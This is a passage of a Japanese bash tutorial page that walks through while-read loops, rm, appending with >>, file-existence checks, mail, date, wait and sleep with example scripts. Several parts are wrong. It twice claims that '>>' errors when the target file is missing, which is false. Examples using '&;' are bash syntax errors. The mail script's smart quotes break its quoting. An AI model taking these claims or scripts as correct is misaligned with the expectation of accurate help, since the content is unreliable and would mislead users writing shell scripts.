&lt;pre tabindex="0">&lt;code class="language-bash:instance-tag.list" data-lang="bash:instance-tag.list">i-0f6126b7aeedfabd6,hoge
i-050536efdd9dc1126,fuga
i-0869f24358fb3f698,f8k
&lt;/code>&lt;/pre>&lt;p>cat します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat instance-tag.list
i-0f6126b7aeedfabd6,hoge
i-050536efdd9dc1126,fuga
i-0869f24358fb3f698,f8k
$
&lt;/code>&lt;/pre>&lt;p>以下のソースファイルを作成します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:whileread_example2.sh" data-lang="bash:whileread_example2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># catしてwhile read で1行ずつ読み込む&lt;/span>
&lt;span class="c1"># 「cat instance-tag.list」の結果を1行ずつ「line」&lt;/span>
&lt;span class="c1"># という変数に代入しています。&lt;/span>
cat instance-tag.list &lt;span class="p">|&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
&lt;span class="c1"># 二つの変数に値切り出して代入&lt;/span>
&lt;span class="c1"># $()は()内で指定したコマンドの実行結果を返します。 &lt;/span>
&lt;span class="c1"># 今回の場合、「echo $line | cut -d, -f 1」の実行結果が&lt;/span>
&lt;span class="c1"># 「instance_id」に定義されます。&lt;/span>
&lt;span class="nv">instance_id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$line&lt;/span> &lt;span class="p">|&lt;/span> cut -d, -f 1&lt;span class="k">)&lt;/span>
&lt;span class="nv">tag_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$line&lt;/span> &lt;span class="p">|&lt;/span> cut -d, -f 2&lt;span class="k">)&lt;/span>
&lt;span class="c1"># 表示&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;instance_id: &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">instance_id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;tag_value: &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">tag_value&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash whileread_example2.sh
instance_id: i-0f6126b7aeedfabd6
tag_value: hoge
instance_id: i-050536efdd9dc1126
tag_value: fuga
instance_id: i-0869f24358fb3f698
tag_value: f8k
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>cutコマンドの部分は、awkコマンドを使うこともあります。&lt;/dd>
&lt;dd>今回は、cutの方が処理速度が速いため、cutコマンドを使いました。&lt;/dd>
&lt;dd>
&lt;p>ちなみにawkの場合は、以下のように記述します。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code>instance_id=$(echo $line | awk -F, '{print $1;}');
tag_value=$(echo $line | awk -F, '{print $2;}');
&lt;/code>&lt;/pre>&lt;h2 id="ファイルを削除する">ファイルを削除する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ファイルを削除します：&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;rm&amp;rsquo;コマンドは、ファイルまたはディレクトリを削除するためのコマンドです。次のコードを使用して「delete_file.sh」という名前のファイルを作成し、ユーザーからファイル名を取得して削除します。ここで、「-i」オプションは、ファイルを削除する前にユーザーに削除確認をに使用されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:delete_file.sh" data-lang="bash:delete_file.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;削除するファイルまたはディレクトリ名を入力して下さい。&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> fn
rm -i &lt;span class="nv">$fn&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls
suzuki/ book.txt
bash delete_file.sh
削除するファイルまたはディレクトリ名を入力して下さい。
suzuki
rm: suzuki: is a directory
bash delete_file.sh
削除するファイルまたはディレクトリ名を入力して下さい。
book.txt
$ ls
suzuki/
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>基本的に、ファイルもディレクトリも削除するコマンドは同じです。ディレクトリには再帰的に（フォルダの階層も含めて）削除するオプション(-r リカーション)があります。&lt;/dd>
&lt;dd>
&lt;p>rm&lt;/p>
&lt;/dd>
&lt;dd>-f :確認をせずに削除&lt;/dd>
&lt;dd>-r ：再帰的に削除&lt;/dd>
&lt;dd>
&lt;p>フォルダを削除&lt;/p>
&lt;/dd>
&lt;dd>rm -rf &lt;target directory>&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>高度なヒント&lt;/dt>
&lt;dd>シェルスクリプトで自動化処理を作成する場合、cp や rm で、確認をせずに実行したいことが多々あります。&lt;/dd>
&lt;dd>この場合は、&lt;/dd>
&lt;dd>
&lt;p>/bin/cp&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>または&lt;/p>
&lt;/dd>
&lt;dd>/bin/rm&lt;/dd>
&lt;dd>
&lt;p>を使うと、確認なしで実行することができます。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="ファイルに追加">ファイルに追加&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ファイルに追加：&lt;/b>&lt;/font>&lt;br>
bashで「&amp;raquo;」演算子を使用すると、既存のファイルに新しいデータを追加できます。&amp;lsquo;append_file.sh &amp;lsquo;という名前のファイルを作成し、次のコードを追加して、ファイルの最後に新しいコンテンツを追加します。ここで、「Learning Level 5」は、スクリプトの実行後に「book.txt」ファイルのに追加されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-:book.txt" data-lang=":book.txt">1. Pro AngularJS
2. Learning JQuery
3. PHP Programming
4. Code Igniter
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash_append_file.sh" data-lang="bash_append_file.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;追加する前のファイル&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
cat book.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;5. Bash Programming&amp;#34;&lt;/span> &amp;gt;&amp;gt; book.txt
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;追加した後のファイル&amp;#34;&lt;/span>
cat book.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash append_file.sh
追加する前のファイル
1. Pro AngularJS
2. Learning JQuery
3. PHP Programming
4. Code Igniter
追加した後のファイル
1. Pro AngularJS
2. Learning JQuery
3. PHP Programming
4. Code Igniter
5. Bash Programming
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>「&amp;gt;」はファイルを新しく作成して追記します。&lt;/dd>
&lt;dd>「&amp;raquo;」は既に存在するファイルに追記します。ですので、ファイルが存在しないにもかかわらず、「&amp;raquo;」を行うと、ついするファイルがないため、エラーとなります。&lt;/dd>
&lt;dd>ファイルの存在を確認するための方法を次の章で説明します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="ファイルが存在するかどうかを確認">ファイルが存在するかどうかを確認&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ファイルが存在するかどうかをテストします。&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;-e&amp;rsquo;または&amp;rsquo;-f&amp;rsquo;オプションを使用して、ファイルの存在を確認できます。次のコードの &amp;lsquo;if [ ]&amp;lsquo;では、ファイルの存在をテストするために「-f」オプションが使用されています。&amp;rsquo; file_exist.sh &amp;lsquo;という名前のファイルを作成し、次のコードを追加します。ここで、ファイル名はコマンドラインから渡されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:file_exist.sh" data-lang="bash:file_exist.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">filename&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$filename&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ファイルが存在します。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ファイルは存在しません。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls
book.txt level.txt
bash file_exist.sh level2.txt
ファイルは存在しません。
bash file_exist.sh level.txt
ファイルが存在します。
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>「&amp;raquo;」（アペンド）を行う場合の注意点は、必ずアペンドするファイルが存在している必要があるところです。&lt;/dd>
&lt;dd>ファイルが存在していればアペンド（追記）する。&lt;/dd>
&lt;dd>ファイルが存在しなければファイルを作成して追記する。&lt;/dd>
&lt;dd>といった処理が必要で、この処理を行わない場合、ファイルが存在しないにもかかわらず、値をファイルに追記しようとした際にエラーとなります。サンプルを以下に示します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash_append_file2.sh" data-lang="bash_append_file2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f level.txt &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="c1"># ファイルが存在するならば追記する&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Bash Programming&amp;#34;&lt;/span> &amp;gt;&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="c1"># ファイルが存在しないからlevel.txtを作成してから追記&lt;/span>
:&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Bash Programming&amp;#34;&lt;/span> &amp;gt;&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;追加した後のファイル&amp;#34;&lt;/span>
cat level.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>touch コマンドと :&amp;gt; の違いを明確にしておく必要があります。&lt;/dd>
&lt;dd>「:&amp;gt;」 は、該当ファイルがなければ作成、あっても空のファイルに置き換えます。&lt;/dd>
&lt;dd>「touch」は、該当ファイルがなければ作成しますが、あれば何もしません。&lt;/dd>
&lt;dd>この違いを利用するとif文はとても簡潔に書き換えることができます。&lt;/dd>
&lt;dd>touchコマンドを使って上記ソースを書き換えてみます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:bash_append_file3.sh" data-lang="bash:bash_append_file3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
:&amp;gt; level.txt &lt;span class="c1"># 新規にファイルを作成&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Shell Scripting&amp;#34;&lt;/span> &amp;gt;&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;1回目に追加したファイル&amp;#34;&lt;/span>
cat level.txt&lt;span class="p">;&lt;/span>
&lt;span class="c1"># 既にファイルが存在するので何もしない&lt;/span>
&lt;span class="c1"># 万が一、ファイルが存在しなければ作成。&lt;/span>
touch level.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Bash Programming&amp;#34;&lt;/span> &amp;gt;&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;2回目に追加したファイル&amp;#34;&lt;/span>
cat level.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash bash_append_file3.sh
1回目に追加したファイル
Shell Scripting
2回目に追加したファイル
Shell Scripting
Bash Programming
$
&lt;/code>&lt;/pre>&lt;h2 id="mailコマンド">mailコマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>メールを送る：&lt;/b>&lt;/font>&lt;br>
' mail &amp;lsquo;または ' sendmail &amp;lsquo;コマンドを使用して電子メールを送信できます。これらのコマンドを使用する前に、mailまたはsendmailに必要なパッケージをインストール・設定をする必要があります。&amp;rsquo; mail_example.sh &amp;lsquo;という名前のファイルを作成し、次のコードを追加して電子メールを送信します。&lt;/p>
&lt;p>mailコマンドインストール&lt;/p>
&lt;p>まずはここを参考に&lt;br>
&lt;a class="link" href="https://qiita.com/TanukiTam/items/abff82573c0f544b3b27" target="_blank" rel="noopener"
>Macでコマンドからメールを送る Gmail&lt;/a>&lt;/p>
&lt;p>linuxの場合は&lt;/p>
&lt;pre tabindex="0">&lt;code>$ yum install mailx
&lt;/code>&lt;/pre>&lt;p>実際にメールを送ってみます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ echo &amp;quot;本文&amp;quot; | mail -s &amp;quot;タイトル&amp;quot; -r from@example.com -c cc1@example.com -c cc2@example.com to1@example.com to2@example.com
&lt;/code>&lt;/pre>&lt;p>恐ろしいほどに簡単ですね。&lt;br>
おかしな事をかんがえるのはやめましょう。&lt;/p>
&lt;p>シェルスクリプトでサンプルを作る&lt;br>
&lt;a class="link" href="mailto:admin@sample.com" >admin@sample.com&lt;/a> の部分を自分のメールアドレスに置き換えて実行して下さい。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mail_example.sh" data-lang="bash:mail_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">Recipient&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;admin@sample.com&amp;#34;&lt;/span>
&lt;span class="nv">Subject&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Greeting”
&lt;/span>&lt;span class="s2">Message=&amp;#34;&lt;/span>Welcome to our site&lt;span class="s2">&amp;#34;
&lt;/span>&lt;span class="s2">`mail -s &lt;/span>&lt;span class="nv">$Subject&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$Recipient&lt;/span>&lt;span class="s2"> &amp;lt;&amp;lt;&amp;lt; &lt;/span>&lt;span class="nv">$Message&lt;/span>&lt;span class="s2">`
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash mail_example.sh
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>くれぐれもおかしな事をかんがえるのはやめましょう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="dateコマンド">dateコマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>現在の日付を解析する：&lt;/b>&lt;/font>&lt;br>
dateコマンドを使用して、現在のシステムの日付と時刻の値を取得することができます。日付と時刻は、「Y」、「m」、「d」、「H」、「M」、および「S」を使用します。&amp;lsquo;date_parse.sh&amp;rsquo;という名前の新しいファイルを作成し、次のコードを追加して、日、月、年、時、分、秒の値を表示します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:date_parse.sh" data-lang="bash:date_parse.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">Year&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%Y&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Month&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%m&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Day&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%d&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Hour&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%H&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Minute&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%M&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Second&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%S&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="sb">`&lt;/span>date&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Current Date is: &lt;/span>&lt;span class="nv">$Day&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$Month&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$Year&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Current Time is: &lt;/span>&lt;span class="nv">$Hour&lt;/span>&lt;span class="s2">:&lt;/span>&lt;span class="nv">$Minute&lt;/span>&lt;span class="s2">:&lt;/span>&lt;span class="nv">$Second&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash date_parse.sh
2022年 1月13日 木曜日 12時19分06秒 JST
Current Date is: 13-01-2022
Current Time is: 12:19:06
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>dateコマンドは覚えるのではなく、manコマンドで都度、探しましょう。きりがないです。できる事を覚えておけばオッケーです。以下にありきたりなパターンを列挙しておきます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code>$ date '+%Y/%m/%d'
2005/09/11
$ date '+%Y/%m/%d(%a)'
2005/09/11(Sun)
$ date '+%y/%m/%d'
05/09/11
$ date '+%F'
2005-09-11
$ date '+%D'
09/11/05
$ date '+%R'
01:18
$ date '+%T'
01:18:01
$ date '+%r'
01:18:06 AM
$ date '+%Y/%m/%d%n%r'
2005/09/11
01:18:27 AM
#↑%n を使用することで、出力に改行を含めることができる。
# 1日後
$ date -d '1 day'
# 2日後
$ date -d '2 days
# 1日前
$ date -d '1 day ago'
# 1ヶ月前
$ date -d '1 month ago'
# 1年前
$ date -d '1 year ago'
# 1時間前
$ date -d '1 hour ago'
# 1分前
$ date -d '1 minute ago'
# 1秒前
$ date -d '1 second ago'
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-:直近5分以内にあるerrorログを表示" data-lang=":直近5分以内にあるerrorログを表示">$ IFSBK=${IFS} ; IFS=$'\n' ; for record in $(cat /var/log/messages ) ; do if [ $(( $(date +&amp;quot;%s&amp;quot;) - 300 )) -lt $(echo ${record} | cut -d&amp;quot; &amp;quot; -f 1,2,3 | date --date=&amp;quot;$(cat -)&amp;quot; +&amp;quot;%s&amp;quot;) ] ; then echo ${record} ; fi ; done | grep error ; IFS=${IFSBK}
&lt;/code>&lt;/pre>&lt;h2 id="waitコマンド">waitコマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>waitコマンド：&lt;/b>&lt;/font>&lt;br>
waitコマンドは、実行中のプロセスの完了を待機するLinuxの組み込みコマンドです。 waitコマンドは、特定のプロセスIDまたはジョブIDで使用されます。waitコマンドでプロセスIDまたはジョブIDが指定されていない場合、現在のすべての子プロセスが完了するのを待機し、終了ステータスを返します。&amp;rsquo; wait_example.sh&amp;rsquo;という名前のファイルを作成し、次のスクリプトを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:wait_example.sh" data-lang="bash:wait_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Wait command&amp;#34;&lt;/span> &lt;span class="p">&amp;amp;&lt;/span>
&lt;span class="nv">process_id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$!&lt;/span>
&lt;span class="nb">wait&lt;/span> &lt;span class="nv">$process_id&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Exited with status &lt;/span>&lt;span class="nv">$?&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash wait_example.sh
Wait command
Exited with status 0
$
&lt;/code>&lt;/pre>&lt;p>わかりにくいですね。&lt;br>
もう少しわかりやすく説明します。&lt;br>
waitコマンドは、他のプロセスの終了まで待機することができるコマンドです。&lt;br>
例えば、以下三つのファイルを実行します。&lt;br>
末尾に &amp;amp; がついているのは、それぞれの実行ファイルをバックグラウンドで並列で実行させることを意味しています。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
bash a.sh &lt;span class="p">&amp;amp;;&lt;/span>
bash b.sh &lt;span class="p">&amp;amp;;&lt;/span>
bash c.sh &lt;span class="p">&amp;amp;;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>では、三つの実行ファイルが全て完了したらコメントを出力するソースに書き直してみます。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:間違ったソース" data-lang="bash:間違ったソース">#!/bin/bash
bash a.sh &amp;amp;;
bash b.sh &amp;amp;;
bash c.sh &amp;amp;;
echo &amp;quot;終了しました&amp;quot;;
&lt;/code>&lt;/pre>&lt;p>上記のソースは、実行の終了を待たずに「終了しました」が出力されます。要するに、コメントの出力は全ての実行を待っていない訳です。正しいソースに書き直してみます。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:正しいソース" data-lang="bash:正しいソース">#!/bin/bash
bash a.sh &amp;amp;;
bash b.sh &amp;amp;;
bash c.sh &amp;amp;;
wait;
echo &amp;quot;終了しました&amp;quot;;
&lt;/code>&lt;/pre>&lt;p>上記のようにwaitコマンドを挟むことで、a.sh, b.sh, c.sh の実行が終了してから完了メッセージを表示させることが出来ました。&lt;/p>
&lt;p>前の処理終了を待ってから、次の処理を実行する方法は以下の通りです。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:処理の終了を待って次の処理へ" data-lang="bash:処理の終了を待って次の処理へ">#!/bin/bash
command1 &amp;amp;
command2 &amp;amp;
wait
command3
&lt;/code>&lt;/pre>&lt;p>上記の様にすると、command1とcommand2が終了してからcommand3が実行される様にできます。command1と2がバックグラウンドで実行され、waitコマンドで処理終了まで待機し、command3が実行されるといった流れです。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>waitコマンドと似ているsleepコマンドについて、次の章で説明します。またsleepコマンドとwaitコマンドを組み合わせて並列処理を行うサンプルも次の章で示します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="sleepコマンド">sleepコマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>sleepコマンド：&lt;/b>&lt;/font>&lt;br>
コマンドの実行を特定の期間一時停止する場合は、sleepコマンドを使用できます。遅延量は、 秒（s）、分（m）、時間（h）、および日（d）で設定できます。&amp;lsquo;sleep_example.sh&amp;rsquo; という名前のファイルを作成し、次のスクリプトを追加します。このスクリプトは、実行後5秒間待機します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:sleep_example.sh" data-lang="bash:sleep_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> “Wait &lt;span class="k">for&lt;/span> &lt;span class="m">5&lt;/span> seconds”
sleep &lt;span class="m">5&lt;/span>
&lt;span class="nb">echo&lt;/span> “Completed”
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash sleep_example.sh
“Wait for 5 seconds”
“Completed”
$
&lt;/code>&lt;/pre>&lt;p>わかりにくいですね。&lt;br>
少し高度だけど、わかりやすいサンプルも書いておきます。&lt;/p>
&lt;h2 id="wait-コマンドのサンプル">wait コマンドのサンプル&lt;/h2>
&lt;p>sleep コマンドをバックグラウンドで実行させ、前の章で使ったwait コマンドで同期をとります。。バックグランドで実行したコマンドのプロセス ID は $! で取得できます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:wait_example.sh" data-lang="bash:wait_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span>&lt;span class="o">((&lt;/span>&lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span>i&amp;lt;3&lt;span class="p">;&lt;/span>i++&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
sleep &lt;span class="m">5&lt;/span> &lt;span class="p">&amp;amp;;&lt;/span>
array&lt;span class="o">[&lt;/span>i&lt;span class="o">]=&lt;/span>&lt;span class="nv">$!&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Sleeping: &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">i&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> : &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">array&lt;/span>&lt;span class="p">[i]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;span class="nb">wait&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">array&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Finish!!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>二つのコマンドの違いは以下の通りです。&lt;/dd>
&lt;dd>sleepは指定した時間だけ処理を遅延&lt;/dd>
&lt;dd>waitはプロセスやジョブの終了を待つ&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
